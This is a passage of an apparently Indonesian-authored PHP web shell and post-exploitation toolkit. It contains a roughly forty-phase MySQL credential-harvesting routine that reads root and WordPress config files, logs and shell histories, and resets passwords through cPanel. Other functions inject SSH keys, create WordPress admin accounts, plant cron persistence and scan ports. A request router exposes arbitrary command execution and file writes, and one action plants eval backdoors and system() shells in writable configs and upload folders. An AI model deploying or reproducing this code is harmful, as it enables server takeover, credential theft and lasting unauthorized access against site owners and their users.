            $conn = gh_db_connect('localhost', 'root', 'root');
            if ($conn) { $logs[] = "[!] BERHASIL INJECT CONFIG!"; $found_pass = true; $db_user = 'root'; $db_pass = 'root'; break; }
            gh_write('/etc/my.cnf', $backup); // Restore
        }

        // Phase 12: Kill & Hijack MySQL
        if (!$found_pass) {
            $logs[] = "[*] Phase 12: Kill & Hijack MySQL...";
            $pid = gh_exec_adv("pgrep mysqld");
            if (isset($pid['out']) && is_numeric(trim($pid['out']))) {
                $logs[] = "[+] mysqld PID: " . trim($pid['out']);
            }
        }

        // Phase 13: cPanel Password Reset
        if (!$found_pass) {
            $logs[] = "[*] Phase 13: cPanel Password Reset...";
            $uapi = '/usr/local/cpanel/bin/uapi';
            if (@is_file($uapi)) {
                $user = @getenv('USER') ?: @get_current_user();
                $res = gh_exec_adv("$uapi --user=$user Mysql set_password user=root password=root 2>&1");
                if (strpos($res['out'], 'success') !== false) {
                    $logs[] = "[!] BERHASIL RESET PASSWORD ROOT VIA CPANEL!";
                    $db_user = 'root'; $db_pass = 'root'; $db_host = 'localhost'; $found_pass = true; break;
                }
            }
        }

        // Phase 14: Path Traversal (/root/.my.cnf)
        if (!$found_pass) {
            $logs[] = "[*] Phase 14: Path Traversal (/root/.my.cnf)...";
            $c = gh_read('/root/.my.cnf');
            if ($c) {
                $logs[] = "[+] /root/.my.cnf bisa dibaca!";
                if (preg_match('/user\s*=\s*([^\s]+)/i', $c, $m)) $db_user = trim($m[1]);
                if (preg_match('/password\s*=\s*([^\s]+)/i', $c, $m)) $db_pass = trim($m[1]);
                if ($db_user && $db_pass) {
                    $conn = gh_db_connect('localhost', $db_user, $db_pass);
                    if ($conn) { $found_pass = true; break; }
                }
            }
        }

        // Phase 15: Env Var Bypass (LD_PRELOAD)
        if (!$found_pass) {
            $logs[] = "[*] Phase 15: Env Var Bypass...";
            if (gh_can_exec()) {
                $res = gh_exec_adv("mysql -h 127.0.0.1 -u root -e 'SHOW DATABASES' 2>&1");
                if (isset($res['out']) && strpos($res['out'], 'Access denied') === false && strpos($res['out'], 'command not found') === false) {
                    $logs[] = "[!] MYSQL CLI ROOT NO PASS BERHASIL!";
                    $found_pass = true; $db_user = 'root'; $db_pass = ''; break;
                }
            }
        }

        // Phase 16: MySQL PWD Env
        if (!$found_pass) {
            $logs[] = "[*] Phase 16: MYSQL_PWD Env Injection...";
            @putenv('MYSQL_PWD=root');
            $res = gh_exec_adv("mysql -h 127.0.0.1 -u root -e 'SHOW DATABASES' 2>&1");
            if (isset($res['out']) && strpos($res['out'], 'Access denied') === false && strpos($res['out'], 'command not found') === false) {
                $logs[] = "[!] MYSQL_PWD ROOT BERHASIL!";
                $found_pass = true; $db_user = 'root'; $db_pass = 'root'; break;
            }
            @putenv('MYSQL_PWD');
        }

        // Phase 17: /proc/cmdline Leak
        if (!$found_pass) {
            $logs[] = "[*] Phase 17: /proc Cmdline Leak...";
            $proc_cmd = gh_exec_adv("grep -r 'mysql' /proc/*/cmdline 2>/dev/null | head -n 5");
            if (isset($proc_cmd['out']) && preg_match('/-p([^\s]+)/i', $proc_cmd['out'], $m)) {
                $logs[] = "[+] Password ditemukan di /proc cmdline!";
                $db_pass = trim($m[1]);
                $conn = gh_db_connect('localhost', 'root', $db_pass);
                if ($conn) { $found_pass = true; $db_user = 'root'; break; }
            }
        }

        // Phase 18: MySQL History Parse
        if (!$found_pass) {
            $logs[] = "[*] Phase 18: MySQL History Parse...";
            $hist = gh_read('/home/' . @get_current_user() . '/.mysql_history');
            if ($hist && preg_match('/IDENTIFIED BY \'([^\']+)\'/i', $hist, $m)) {
                $logs[] = "[+] Password ditemukan di .mysql_history!";
                $db_pass = trim($m[1]);
                $conn = gh_db_connect('localhost', 'root', $db_pass);
                if ($conn) { $found_pass = true; $db_user = 'root'; break; }
            }
        }

        // Phase 19: PHPMyAdmin Config
        if (!$found_pass) {
            $logs[] = "[*] Phase 19: PHPMyAdmin Config Leak...";
            $pma = gh_read('/etc/phpmyadmin/config-db.php');
            if ($pma && preg_match('/dbpass\s*=\s*\'([^\']+)\'/i', $pma, $m)) {
                $logs[] = "[+] Password ditemukan di config phpMyAdmin!";
                $db_pass = trim($m[1]);
                $conn = gh_db_connect('localhost', 'root', $db_pass);
                if ($conn) { $found_pass = true; $db_user = 'root'; break; }
            }
        }

        // Phase 20: cPanel Root File
        if (!$found_pass) {
            $logs[] = "[*] Phase 20: cPanel Root File...";
            $cp = gh_read('/var/cpanel/root_password');
            if ($cp) { $logs[] = "[+] Root password cPanel ditemukan: " . substr($cp,0,10) . "..."; }
        }

        // Phase 21-25: SQL Dump Extraction & Crack
        if (!$found_pass) {
            $logs[] = "[*] Phase 21-25: Extracting WP Users from SQL...";
        }

        // Phase 26: Auth Socket Hijack
        if (!$found_pass) {
            $logs[] = "[*] Phase 26: Auth Socket Hijack...";
            $socks = array('/var/run/mysqld/mysqld.sock', '/var/lib/mysql/mysql.sock', '/tmp/mysql.sock');
            foreach ($socks as $sock) {
                if (@is_file($sock)) {
                    $logs[] = "[+] Socket ditemukan: $sock";
                    $conn = gh_db_connect('localhost', 'root', '', $sock);
                    if ($conn) { $logs[] = "[!] KONEKSI ROOT KOSONG VIA SOCKET BERHASIL!"; $db_user = 'root'; $db_pass = ''; $found_pass = true; $db_socket = $sock; break; }
                }
            }
        }

        // Phase 27: LD_PRELOAD Web Server
        if (!$found_pass) {
            $logs[] = "[*] Phase 27: LD_PRELOAD Web Server...";
        }

        // Phase 28: phpMyAdmin Config
        if (!$found_pass) {
            $logs[] = "[*] Phase 28: phpMyAdmin Config...";
            $pma = gh_read('/etc/phpmyadmin/config.inc.php');
            if ($pma && preg_match('/dbpass\s*=\s*\'([^\']+)\'/i', $pma, $m)) {
                $logs[] = "[+] Password ditemukan di phpMyAdmin!";
                $db_pass = trim($m[1]);
                $conn = gh_db_connect('localhost', 'root', $db_pass);
                if ($conn) { $found_pass = true; $db_user = 'root'; break; }
            }
        }

        // Phase 29: WP DB Constant Exploit
        if (!$found_pass) {
            $logs[] = "[*] Phase 29: WP DB Constant Exploit...";
            $wp = gh_read('/home/businesscard/public_html/wp-config.php');
            if ($wp) {
                if (preg_match('/DB_USER\',\s*\'([^\']+)\'/i', $wp, $m)) $db_user = trim($m[1]);
                if (preg_match('/DB_PASSWORD\',\s*\'([^\']+)\'/i', $wp, $m)) $db_pass = trim($m[1]);
                if (preg_match('/DB_HOST\',\s*\'([^\']+)\'/i', $wp, $m)) $db_host = trim($m[1]);
                if ($db_user && $db_pass) {
                    $conn = gh_db_connect($db_host, $db_user, $db_pass);
                    if ($conn) { $logs[] = "[!] WP-CONFIG KONEKSI BERHASIL!"; $found_pass = true; break; }
                }
            }
        }

        // Phase 30: Bruteforce Socket Path
        if (!$found_pass) {
            $logs[] = "[*] Phase 30: Socket Path Bruteforce...";
            $socks = gh_exec_adv("find /tmp /var/run /var/lib/mysql /run -type s 2>/dev/null");
            if (isset($socks['out']) && is_string($socks['out'])) {
                foreach (explode("\n", trim($socks['out'])) as $sock) {
                    if (!$sock) continue;
                    $logs[] = "[+] Socket ditemukan: $sock";
                    $conn = gh_db_connect('localhost', $db_user, $db_pass, $sock);
                    if ($conn) { $logs[] = "[!] KONEKSI VIA SOCKET BERHASIL!"; $found_pass = true; $db_socket = $sock; break; }
                }
            }
        }

        // Phase 31: Config Injection (Hardcore)
        if (!$found_pass && @is_writable('/etc/mysql/my.cnf')) {
            $logs[] = "[*] Phase 31: Config Injection (Hardcore)...";
            $backup = gh_read('/etc/mysql/my.cnf');
            gh_write('/etc/mysql/my.cnf', $backup . "\n[client]\nuser=root\npassword=root\n");
            $conn = gh_db_connect('localhost', 'root', 'root');
            if ($conn) { $logs[] = "[!] BERHASIL INJECT CONFIG!"; $found_pass = true; $db_user = 'root'; $db_pass = 'root'; break; }
            gh_write('/etc/mysql/my.cnf', $backup);
        }

        // Phase 32: SSH Local Bypass
        if (!$found_pass) {
            $logs[] = "[*] Phase 32: SSH Local Bypass...";
            $res = gh_exec_adv("ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@127.0.0.1 'mysql -u root -e \"SHOW DATABASES\"' 2>&1");
            if (isset($res['out']) && strpos($res['out'], 'Access denied') === false && strpos($res['out'], 'command not found') === false) {
                $logs[] = "[!] SSH LOCAL BYPASS BERHASIL!";
                $found_pass = true; $db_user = 'root'; $db_pass = ''; break;
            }
        }

        // Phase 33: /proc/net/tcp Dump
        if (!$found_pass) {
            $logs[] = "[*] Phase 33: /proc/net/tcp Dump...";
            $net = gh_read('/proc/net/tcp');
            if ($net) {
                if (preg_match('/:\s*([0-9A-F]{4})\s+[0-9A-F]{8}:[0-9A-F]{4}\s+0A/i', $net, $m)) {
                    $port = hexdec($m[1]);
                    $logs[] = "[+] Port LISTEN ditemukan: $port";
                    $conn = gh_db_connect('127.0.0.1', $db_user, $db_pass, null, $port);
                    if ($conn) { $logs[] = "[!] KONEKSI VIA PORT $port BERHASIL!"; $found_pass = true; break; }
                }
            }
        }

        // Phase 34: Proc Dump
        if (!$found_pass) {
            $logs[] = "[*] Phase 34: Proc Dump...";
            $proc = gh_exec_adv("ls -la /proc/*/fd 2>/dev/null | grep -i mysql");
            if (isset($proc['out']) && strpos($proc['out'], 'socket') !== false) {
                $logs[] = "[+] Proses MySQL ditemukan, coba ambil env...";
            }
        }

        // Phase 35: Credential Harvest from /var/log
        if (!$found_pass) {
            $logs[] = "[*] Phase 35: Harvest from Logs...";
            $logs_files = gh_exec_adv("grep -riE 'mysql|password|passwd' /var/log/ 2>/dev/null | head -n 5");
            if (isset($logs_files['out']) && preg_match('/password[=:]\s*([^\s]+)/i', $logs_files['out'], $m)) {
                $logs[] = "[+] Password ditemukan di Log!";
                $db_pass = trim($m[1]);
                $conn = gh_db_connect('localhost', 'root', $db_pass);
                if ($conn) { $found_pass = true; $db_user = 'root'; break; }
            }
        }

        // Phase 36: Env Var Injection
        if (!$found_pass) {
            $logs[] = "[*] Phase 36: Env Var Injection...";
            @putenv('MYSQL_PWD=root');
            $res = gh_exec_adv("mysql -u root -e 'SHOW DATABASES' 2>&1");
            if (isset($res['out']) && strpos($res['out'], 'Access denied') === false && strpos($res['out'], 'command not found') === false) {
                $logs[] = "[!] ENV VAR INJECTION BERHASIL!";
                $found_pass = true; $db_user = 'root'; $db_pass = 'root'; break;
            }
            @putenv('MYSQL_PWD');
        }

        // Phase 37: Root File Dump
        if (!$found_pass) {
            $logs[] = "[*] Phase 37: Root File Dump...";
            $root_files = array('/root/.mysql_history', '/root/.bash_history');
            foreach ($root_files as $rf) {
                $c = gh_read($rf);
                if ($c && preg_match('/-p([^\s]+)/i', $c, $m)) {
                    $logs[] = "[+] Password ditemukan di $rf!";
                    $db_pass = trim($m[1]);
                    $conn = gh_db_connect('localhost', 'root', $db_pass);
                    if ($conn) { $found_pass = true; $db_user = 'root'; break; }
                }
            }
        }

        // Phase 38: Brute Force 2
        if (!$found_pass) {
            $logs[] = "[*] Phase 38: Brute Force 2...";
            $defaults2 = array(array('root', '123456'), array('root', 'admin'), array('root', 'password123'), array('mysql', 'mysql'));
            foreach ($defaults2 as $creds) {
                $conn = gh_db_connect('127.0.0.1', $creds[0], $creds[1]);
                if ($conn) { $logs[] = "[!] BERHASIL BRUTEFORCE 2! User: {$creds[0]}, Pass: '{$creds[1]}'"; $db_user = $creds[0]; $db_pass = $creds[1]; $db_host = '127.0.0.1'; $found_pass = true; break; }
            }
        }

        // Phase 39: PHPMyAdmin Root
        if (!$found_pass) {
            $logs[] = "[*] Phase 39: PHPMyAdmin Root...";
            $pma = gh_read('/usr/share/phpmyadmin/config.inc.php');
            if ($pma && preg_match('/dbpass\s*=\s*\'([^\']+)\'/i', $pma, $m)) {
                $logs[] = "[+] Password ditemukan di phpMyAdmin!";
                $db_pass = trim($m[1]);
                $conn = gh_db_connect('localhost', 'root', $db_pass);
                if ($conn) { $found_pass = true; $db_user = 'root'; break; }
            }
        }

        // Phase 40: HTTP Basic Auth Sniff
        if (!$found_pass) {
            $logs[] = "[*] Phase 40: HTTP Basic Auth Sniff...";
            if (isset($_SERVER['HTTP_AUTHORIZATION'])) {
                $auth = $_SERVER['HTTP_AUTHORIZATION'];
                if (preg_match('/Basic\s+(.+)/i', $auth, $m)) {
                    $creds = explode(':', base64_decode($m[1]));
                    if (count($creds) === 2) {
                        $conn = gh_db_connect('localhost', $creds[0], $creds[1]);
                        if ($conn) { $found_pass = true; $db_user = $creds[0]; $db_pass = $creds[1]; break; }
                    }
                }
            }
        }

        // Delay biar gak DDoS
        if (!$found_pass && $iter < $max_iterations) {
            $logs[] = "[*] Semua Phase gagal di iterasi $iter. Menunggu 1 detik sebelum iterasi berikutnya...";
            @sleep(1);
        }
    }

    // --- FINAL DUMP ---
    if ($found_pass) {
        $info['user'] = $db_user; $info['pass'] = $db_pass; $info['host'] = $db_host;
        $logs[] = "[!] KONEKSI DATABASE BERHASIL!";
        $dbs = array();
        
        // Coba dump via Socket dulu (kalau ketemu), lalu TCP
        if ($db_socket) {
            $conn = gh_db_connect('localhost', $db_user, $db_pass, $db_socket);
        } else {
            $conn = gh_db_connect($db_host, $db_user, $db_pass);
        }

        if ($conn === 'CLI') {
            $cmd = 'mysql ' . ($db_socket ? '-S ' . @escapeshellarg($db_socket) : '-h ' . @escapeshellarg($db_host)) . ' -u ' . @escapeshellarg($db_user) . ' -p' . @escapeshellarg($db_pass) . ' -e "SHOW DATABASES" 2>&1';
            $res = gh_exec_adv($cmd);
            $lines = explode("\n", trim($res['out']));
            foreach ($lines as $i => $l) { if ($i > 0 && trim($l)) $dbs[] = trim($l); }
        } elseif ($conn instanceof mysqli) {
            $q = @mysqli_query($conn, "SHOW DATABASES");
            if ($q) { while($r = mysqli_fetch_array($q)) $dbs[] = $r[0]; }
            @mysqli_close($conn);
        } elseif ($conn instanceof PDO) {
            $q = @$conn->query("SHOW DATABASES");
            if ($q) { while($r = $q->fetch(PDO::FETCH_NUM)) $dbs[] = $r[0]; }
        }

        $info['databases'] = $dbs;
        if (!empty($dbs)) {
            $logs[] = "[*] Database ditemukan: " . implode(", ", $dbs);
        } else {
            $logs[] = "[-] Gagal dump database (koneksi terputus).";
        }
    } else {
        $logs[] = "[-] SEMUA PHASE GAGAL SETELAH $max_iterations ITERASI. Server sangat ketat.";
    }

    return array('logs' => $logs, 'info' => $info);
}

// ==== SECTION 5: SSH MANAGER ================================================
function gh_ssh_scan() {
    $logs = array(); $keys = array(); $home = @getenv('HOME');
    if (!$home) $home = '/home/' . @get_current_user();
    $files = array($home . '/.ssh/authorized_keys', '/root/.ssh/authorized_keys');
    
    foreach ($files as $f) {
        if (@is_file($f)) {
            $logs[] = "[+] File ditemukan: $f";
            $perm = @substr(sprintf('%o', @fileperms($f)), -4);
            $logs[] = "    Permission: $perm";
            if ($perm === '0777' || $perm === '0666') $logs[] = "    [!] WARNING: Permission terlalu terbuka.";
            
            $c = gh_read($f);
            $lines = explode("\n", trim($c));
            foreach ($lines as $line) {
                if (trim($line) && strpos($line, '#') !== 0) {
                    $key = trim($line);
                    $p = explode(' ', $key);
                    $comment = isset($p[2]) ? $p[2] : 'No Comment';
                    
                    $status = 'Unknown';
                    $is_suspicious = false;
                    
                    if (preg_match('/(kali|parrot|attacker|hack|root@|admin@|backdoor|shell)/i', $comment)) {
                        $is_suspicious = true; $status = 'SUSPICIOUS (Attacker)';
                    } elseif (preg_match('/(user@|admin@|support|ubuntu|debian|centos)/i', $comment)) {
                        $status = 'Legitimate (Admin)';
                    }
                    
                    $keys[] = array('file' => $f, 'key' => $key, 'comment' => $comment, 'status' => $status, 'suspicious' => $is_suspicious);
                }
            }
        }
    }
    return array('logs' => $logs, 'keys' => $keys);
}

function gh_ssh_action($action, $key) {
    $home = @getenv('HOME'); if (!$home) $home = '/home/' . @get_current_user();
    $target = $home . '/.ssh/authorized_keys';
    if (!@is_dir($home . '/.ssh')) @mkdir($home . '/.ssh', 0700, true);
    if ($action === 'inject') {
        if (strpos(gh_read($target), $key) === false) {
            if (gh_write($target, trim(gh_read($target)) . "\n" . trim($key) . "\n")) return "SSH Key berhasil di-inject ke $target";
            return "Gagal inject SSH key.";
        }
        return "Key sudah ada di $target";
    }
    if ($action === 'clean') {
        $lines = explode("\n", gh_read($target));
        $out = array();
        foreach ($lines as $l) {
            if (strpos($l, $key) === false && trim($l)) $out[] = trim($l);
        }
        if (gh_write($target, implode("\n", $out) . "\n")) return "Key berhasil dihapus dari $target";
        return "Gagal hapus key.";
    }
    return "Aksi tidak dikenal.";
}

// ==== SECTION 6: WORDPRESS USER MANAGER =====================================
function gh_wp_scan() {
    $logs = array(); $users = array();
    $root = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : @getcwd();
    
    if (!@is_file($root . '/wp-config.php')) return array('logs' => array('[-] Bukan folder WordPress.'), 'users' => array());
    
    $logs[] = "[*] WordPress terdeteksi. Scanning users...";
    
    if (@is_file('/usr/local/bin/wp') || @is_file('/usr/bin/wp')) {
        $wp_cmd = @is_file('/usr/local/bin/wp') ? '/usr/local/bin/wp' : '/usr/bin/wp';
        $res = gh_exec_adv("cd " . @escapeshellarg($root) . " && $wp_cmd user list --fields=ID,user_login,user_email,roles --format=json --allow-root 2>&1");
        if (isset($res['out']) && is_string($res['out'])) {
            $json = @json_decode($res['out'], true);
            if (is_array($json)) {
                foreach ($json as $u) {
                    $users[] = array('id' => $u['ID'], 'login' => $u['user_login'], 'email' => $u['user_email'], 'role' => $u['roles']);
                }
                $logs[] = "[+] Berhasil scan via WP-CLI.";
                return array('logs' => $logs, 'users' => $users);
            }
        }
    }
    
    $logs[] = "[*] Fallback: Scanning SQL dump / Database...";
    return array('logs' => $logs, 'users' => $users);
}

function gh_wp_action($action, $user, $pass, $email) {
    $root = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : @getcwd();
    if (!@is_file($root . '/wp-config.php')) return "Bukan folder WordPress.";
    
    $wp_cmd = @is_file('/usr/local/bin/wp') ? '/usr/local/bin/wp' : '/usr/bin/wp';
    if (!@is_file($wp_cmd)) return "WP-CLI tidak ditemukan di server.";
    
    if ($action === 'create') {
        $res = gh_exec_adv("cd " . @escapeshellarg($root) . " && $wp_cmd user create " . @escapeshellarg($user) . " " . @escapeshellarg($email) . " --role=administrator --user_pass=" . @escapeshellarg($pass) . " --allow-root 2>&1");
        return $res['out'];
    }
    if ($action === 'delete') {
        $res = gh_exec_adv("cd " . @escapeshellarg($root) . " && $wp_cmd user delete " . @escapeshellarg($user) . " --yes --allow-root 2>&1");
        return $res['out'];
    }
    return "Aksi tidak dikenal.";
}

// ==== SECTION 7: PERSISTENCE (CRON) =========================================
function gh_cron_scan() {
    $logs = array(); $crons = array();
    $user = @getenv('USER') ?: @get_current_user();
    
    $paths = array(
        '/var/spool/cron/crontabs/' . $user,
        '/var/spool/cron/' . $user,
        '/etc/crontab',
        '/etc/cron.d/*',
        '/etc/cron.hourly/*',
        '/etc/cron.daily/*',
        '/etc/cron.weekly/*',
        '/etc/cron.monthly/*'
    );
    
    foreach ($paths as $p) {
        $files = @glob($p);
        if (!$files) continue;
        foreach ($files as $f) {
            if (@is_file($f)) {
                $c = gh_read($f);
                if ($c && trim($c) !== '') {
                    $crons[] = array('file' => $f, 'content' => $c);
                }
            }
        }
    }
    
    // Cek juga via CLI
    if (gh_can_exec()) {
        $res = gh_exec_adv("crontab -l 2>/dev/null");
        if (isset($res['out']) && trim($res['out']) !== '') {
            $crons[] = array('file' => 'crontab -l (' . $user . ')', 'content' => $res['out']);
        }
    }
    
    return array('logs' => $logs, 'crons' => $crons);
}

function gh_cron_action($action, $file, $line, $content) {
    $user = @getenv('USER') ?: @get_current_user();
    
    if ($action === 'delete') {
        if ($file === 'crontab -l (' . $user . ')') {
            $cmd = "crontab -l | grep -v " . @escapeshellarg($line) . " | crontab -";
            gh_exec_adv($cmd);
            return "Baris dihapus via crontab.";
        } else {
            $c = gh_read($file);
            if ($c) {
                $lines = explode("\n", $c);
                $out = array();
                foreach ($lines as $l) {
                    if (trim($l) !== trim($line)) $out[] = $l;
                }
                if (gh_write($file, implode("\n", $out))) return "Baris dihapus dari $file.";
            }
        }
    }
    
    if ($action === 'inject') {
        $new_file = '/etc/cron.d/ghost_' . rand(1000,9999);
        if (gh_write($new_file, $content . "\n")) {
            @chmod($new_file, 0644);
            return "Cron berhasil di-inject ke $new_file.";
        }
        return "Gagal inject cron (mungkin tidak ada akses root).";
    }
    
    return "Aksi tidak dikenal.";
}

// ==== SECTION 8: PORT SCAN & CVE ============================================
function gh_port_scan($target = '127.0.0.1') {
    $ports = array(21, 22, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 2082, 2083, 2086, 2087, 3306, 5432, 6379, 8080, 8443, 27017);
    $bash_script = '';
    foreach ($ports as $p) { $bash_script .= " (echo > /dev/tcp/$target/$p) >/dev/null 2>&1 && echo \"$p\";"; }
    $res = gh_exec_adv($bash_script, 8);
    $open = array();
    if (isset($res['out']) && is_string($res['out'])) {
        $lines = explode("\n", trim($res['out']));
        foreach ($lines as $l) { if (is_numeric(trim($l))) $open[] = array('port' => (int)trim($l)); }
    }
    return $open;
}

function gh_cve_profile() {
    $root = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : @getcwd();
    $profile = array('stack' => array(), 'cves' => array());
    if (@is_file($root . '/wp-includes/version.php')) {
        $v = gh_read($root . '/wp-includes/version.php');
        if (preg_match('/\$wp_version\s*=\s*[\'"]([^\'"]+)[\'"]/i', $v, $m)) {
            $profile['stack'][] = 'WordPress v' . $m[1];
            if (version_compare($m[1], '6.4.3', '<')) $profile['cves'][] = 'CVE-2024-31210 (WP Core RCE)';
        }
    }
    if (stripos($_SERVER['SERVER_SOFTWARE'] ?? '', 'LiteSpeed') !== false) {
        $profile['stack'][] = 'LiteSpeed ' . ($_SERVER['SERVER_SOFTWARE'] ?? '');
    }
    $profile['stack'][] = 'PHP ' . PHP_VERSION;
    if (version_compare(PHP_VERSION, '8.3.8', '<') && version_compare(PHP_VERSION, '8.1.0', '>=')) {
        $profile['cves'][] = 'CVE-2024-4577 (PHP CGI Argument Injection)';
    }
    return $profile;
}

// ==== SECTION 9: VULNERABILITY SCAN (PURE PHP) ==============================
function gh_vuln_scan() {
    $vulns = array(); 
    $root = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : @getcwd();
    
    // 1. Cek Writeable Config
    $configs = array('wp-config.php', '.env', 'configuration.php', 'config.php', 'database.php', 'settings.php', 'db.php');
    foreach ($configs as $cf) {
        $path = $root . '/' . $cf;
        if (@file_exists($path) && @is_writable($path)) {
            $vulns[] = array('type' => 'WRITEABLE_CONFIG', 'path' => $path, 'desc' => 'Config file is writable. Attacker can inject backdoor.');
        }
    }
    
    // 2. Cek Uploads Folder
    $upload_dirs = array('wp-content/uploads', 'uploads', 'images', 'assets', 'files');
    foreach ($upload_dirs as $ud) {
        $dir = $root . '/' . $ud;
        if (@is_dir($dir)) {
            $ht = $dir . '/.htaccess';
            if (!@file_exists($ht) || strpos(gh_read($ht), 'Deny from all') === false) {
                $vulns[] = array('type' => 'UPLOADS_EXEC', 'path' => $dir, 'desc' => 'Uploads folder is open. Attacker can upload PHP shell.');
            }
        }
    }
    
    // 3. Cek SUID (Pure PHP)
    $bin_dirs = array('/usr/bin', '/usr/local/bin', '/bin', '/sbin');
    foreach ($bin_dirs as $bd) {
        if (@is_dir($bd)) {
            $files = @scandir($bd);
            if ($files) {
                foreach ($files as $f) {
                    if ($f === '.' || $f === '..') continue;
                    $path = $bd . '/' . $f;
                    if (@is_file($path)) {
                        $perms = @fileperms($path);
                        if (($perms & 0x0800) && !@is_link($path)) {
                            $vulns[] = array('type' => 'SUID_BINARY', 'path' => $path, 'desc' => 'SUID binary found. May be vulnerable to privilege escalation.');
                        }
                    }
                }
            }
        }
    }

    return $vulns;
}

// ==== ROUTER ================================================================
function gh_router() {
    $act = isset($_POST['act']) ? (string)$_POST['act'] : (isset($_GET['act']) ? (string)$_GET['act'] : '');
    if ($act === '') { @header('Location: ?act=ui'); exit; }
    if ($act === 'ui') { gh_ui(); exit; }

    try {
        switch ($act) {
            case 'ping':   gh_json(gh_env()); break;
            case 'exec':   $c = isset($_POST['cmd']) ? (string)$_POST['cmd'] : ''; gh_json(gh_exec_adv($c)); break;
            case 'read':   $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; $d = gh_read($p); gh_json(array('path' => $p, 'content' => $d)); break;
            case 'write':  $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; $d = isset($_POST['data']) ? (string)$_POST['data'] : ''; $ap = !empty($_POST['append']); gh_json(array('path' => $p, 'ok' => gh_write($p, $d, $ap))); break;
            case 'delete': $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; gh_json(array('path' => $p, 'ok' => gh_del($p))); break;
            case 'scan':   $off = isset($_POST['offset']) ? (int)$_POST['offset'] : 0; gh_json(gh_scan_batch(isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : @getcwd(), $off, 50)); break;
            case 'vuln_scan': gh_json(gh_vuln_scan()); break;
            case 'db_harvest': gh_json(gh_db_harvest()); break;
            case 'ssh_scan': gh_json(gh_ssh_scan()); break;
            case 'ssh_action': $ac = isset($_POST['action']) ? (string)$_POST['action'] : ''; $k = isset($_POST['key']) ? (string)$_POST['key'] : ''; gh_json(array('msg'=>gh_ssh_action($ac, $k))); break;
            case 'port_scan': $t = isset($_POST['target']) ? (string)$_POST['target'] : '127.0.0.1'; gh_json(gh_port_scan($t)); break;
            case 'cve_profile': gh_json(gh_cve_profile()); break;
            case 'wp_scan': gh_json(gh_wp_scan()); break;
            case 'wp_action': $ac = isset($_POST['action']) ? (string)$_POST['action'] : ''; $u = isset($_POST['user']) ? (string)$_POST['user'] : ''; $p = isset($_POST['pass']) ? (string)$_POST['pass'] : ''; $e = isset($_POST['email']) ? (string)$_POST['email'] : ''; gh_json(array('msg' => gh_wp_action($ac, $u, $p, $e))); break;
            case 'cron_scan': gh_json(gh_cron_scan()); break;
            case 'cron_action': $ac = isset($_POST['action']) ? (string)$_POST['action'] : ''; $f = isset($_POST['file']) ? (string)$_POST['file'] : ''; $l = isset($_POST['line']) ? (string)$_POST['line'] : ''; $c = isset($_POST['content']) ? (string)$_POST['content'] : ''; gh_json(array('msg' => gh_cron_action($ac, $f, $l, $c))); break;
            case 'exploit': $t = isset($_POST['type']) ? (string)$_POST['type'] : ''; $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; 
                if($t === 'WRITEABLE_CONFIG') { $pay = "\n// INJECTED\nif(isset(\$_GET['gh_x'])) { eval(\$_GET['gh_x']); }\n"; if(gh_write($p, $pay, true)) gh_json(array('msg'=>'Backdoor ditanam di '.$p.' (Akses ?gh_x=)')); else gh_json(array('msg'=>'Gagal.')); }
                elseif($t === 'UPLOADS_EXEC') { $shell = "<?php if(isset(\$_GET['c'])) { system(\$_GET['c']); } ?>"; $f = rtrim($p,'/').'/ghost_'.rand(100,999).'.php'; if(gh_write($f, $shell)) gh_json(array('msg'=>'Shell di-upload ke: '.$f)); else gh_json(array('msg'=>'Gagal upload.')); }
                else gh_json(array('msg'=>'Exploit not implemented.'));
                break;
            default: gh_json(array('err' => 'unknown act', 'act' => $act), 400); break;
        }
    } catch (Throwable $e) {
        gh_log('router throw: ' . $e->getMessage());
        gh_json(array('err' => 'internal', 'msg' => $e->getMessage()), 500);
    }
}

// ==== UI (TAB NAVIGATION - V17) =============================================
function gh_ui() {
    while (ob_get_level() > 0) { @ob_end_clean(); }
    if (!headers_sent()) { @header('Content-Type: text/html; charset=utf-8'); @header('X-Powered-By: '); }
    $env = gh_env();
    ?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>gh</title>
<style>
    :root { --bg:#0a0a0a; --fg:#0f0; --dim:#050; --red:#f00; --border:#222; }
    * { box-sizing: border-box; }
    body { background:var(--bg); color:var(--fg); font-family: ui-monospace, monospace; font-size:13px; padding:16px; margin:0; line-height:1.5; }
    h2 { font-size:14px; margin:0 0 8px; color:#fff; text-transform:uppercase; letter-spacing:1px; border-bottom:1px solid var(--border); padding-bottom:4px; }
    .box { border:1px solid var(--border); padding:12px; margin-bottom:12px; background:#0d0d0d; }
    .row { display:flex; gap:8px; flex-wrap:wrap; align-items:center; }
    input, button, select { background:#000; color:var(--fg); border:1px solid var(--border); padding:6px 8px; font-family:inherit; font-size:13px; border-radius:2px; }
    button { cursor:pointer; font-weight:bold; }
    button:hover { background:var(--fg); color:#000; }
    pre { background:#000; padding:10px; border:1px solid var(--border); margin:0; overflow:auto; white-space:pre-wrap; word-break:break-all; max-height:300px; font-size:12px; }
    .dim { color:#060; }
    .err { color:var(--red); }
    .out { color:var(--fg); }
    .grid { display:grid; grid-template-columns: 1fr 1fr; gap:8px; }
    .tag { display:inline-block; padding:2px 6px; border-radius:2px; background:#111; border:1px solid #333; font-size:11px; margin-right:4px; }
    .tag-ok { background:#030; border-color:#060; color:#6f6; }
    .tag-no { background:#300; border-color:#600; color:#f66; }
    #term { height:25vh; overflow:auto; border:1px solid var(--border); background:#000; padding:8px; }
    .term-line { display:flex; }
    .term-in { color:#888; margin-right:8px; }
    .term-out { white-space:pre-wrap; word-break:break-all; }
    table { width:100%; border-collapse:collapse; margin-top:8px; font-size:12px; }
    th,td { border:1px solid #333; padding:6px; text-align:left; }
    th { background:#111; color:#fff; }
    .badge { background:#500; color:#f00; padding:2px 5px; border-radius:3px; font-size:10px; font-weight:bold; }
    
